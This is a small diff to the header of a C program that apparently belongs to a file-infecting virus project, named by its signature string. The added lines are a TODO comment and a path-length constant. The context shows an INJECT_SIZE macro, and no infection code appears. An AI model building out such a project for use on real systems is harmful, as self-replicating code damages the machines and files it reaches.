@@ -3,6 +3,8 @@
 
 #define _GNU_SOURCE
 
+/* TODO: Remove useless h files */
+
 # include <dirent.h>
 # include <errno.h>
 # include <fcntl.h>
@@ -26,6 +28,8 @@
 # ifndef INJECT_SIZE
 #  define INJECT_SIZE 0
 # endif
+
+# define MAX_PATH_LENGTH 4096
 
 # define SIGNATURE "Famine version 1.0 (c)oded by lmartin"
 
